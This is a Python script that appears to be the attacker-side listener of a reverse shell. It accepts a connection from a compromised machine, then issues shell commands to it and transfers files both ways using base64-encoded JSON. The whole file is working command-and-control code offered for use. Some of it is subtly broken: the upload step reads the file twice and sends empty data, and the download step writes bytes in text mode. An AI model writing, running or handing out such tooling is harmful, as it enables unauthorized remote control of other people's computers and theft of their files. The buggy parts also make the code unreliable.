#!/usr/bin/python3

import sys
import json
import base64
import socket
from termcolor import colored


def s_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode("utf-8"))

def s_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024).decode("utf-8")
            print(type(json_data))
            encoded_data = json.loads(json_data)
            return encoded_data
        except ValueError:
            continue

def shell():
    while True:
        command = input("Shell@{}~".format(ip[0]))
        s_send(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "w") as fout:
                encoded_data = s_recv()
                print(type(encoded_data))
                data = base64.b64decode(encoded_data)
                print(type(data))
                fout.write(data)
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    print(type(base64.b64encode(fin.read())))
                    s_send(base64.b64encode(fin.read()))
            except:
                print(colored("Upload Failed !!!", "red"))
        else:
            result = s_recv()
            print(result)

def server ():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((sys.argv[1],int(sys.argv[2])))
    s.listen(5)
    print(colored("[+] Listening For Incoming Connections", "green"))
    target, ip = s.accept()
    print(colored("[+] Connection Established From : {}".format(ip), "green"))
    
server()
shell()
s.close()
print(colored("Closing connection !!!", "red"))
sys.exit()